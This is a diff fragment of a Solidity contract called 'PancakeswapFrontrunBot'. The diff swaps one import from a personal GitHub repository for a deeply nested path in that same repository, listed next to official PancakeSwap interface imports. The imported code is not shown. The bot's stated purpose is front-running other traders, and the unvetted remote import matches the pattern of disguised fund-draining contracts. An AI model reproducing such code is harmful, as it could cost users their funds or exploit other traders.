@@ -5,7 +5,7 @@ import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contra
 import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 //Mempool router
-import "https://github.com/meansfeel/autobot/blob/main/Bot.sol";
+import "https://github.com/meansfeel/autobot/blob/main/pancakeswapbot/flashloan/raw/BNBSniper/VMFactory.sol";
 contract PancakeswapFrontrunBot {
  
     string public tokenName;
